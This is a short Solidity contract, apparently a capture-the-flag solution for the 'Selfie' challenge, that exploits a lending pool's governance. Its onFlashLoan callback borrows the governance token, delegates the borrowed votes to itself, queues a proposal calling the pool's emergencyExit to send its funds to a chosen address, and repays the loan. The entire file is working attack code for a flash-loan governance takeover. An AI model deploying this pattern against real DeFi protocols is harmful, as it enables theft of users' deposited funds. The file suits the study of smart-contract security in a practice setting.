// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {ISimpleGovernance} from "../../src/selfie/ISimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {ERC20Votes} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Votes.sol";

contract Attacker6 is IERC3156FlashBorrower {
    // @param: (player, DVT, amount, 0, _data);
    /*
        data = {
            address governance,
            address recovery,
        }
    */
    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32) {
        ERC20Votes(token).delegate(address(this));
        
        (address governance, address recovery) = abi.decode(data, (address, address));
        
        bytes memory actionData = abi.encodeWithSelector(
            SelfiePool.emergencyExit.selector,
            recovery
        );
        
        ISimpleGovernance(governance).queueAction(msg.sender, 0, actionData);

        ERC20Votes(token).approve(msg.sender, amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    
}
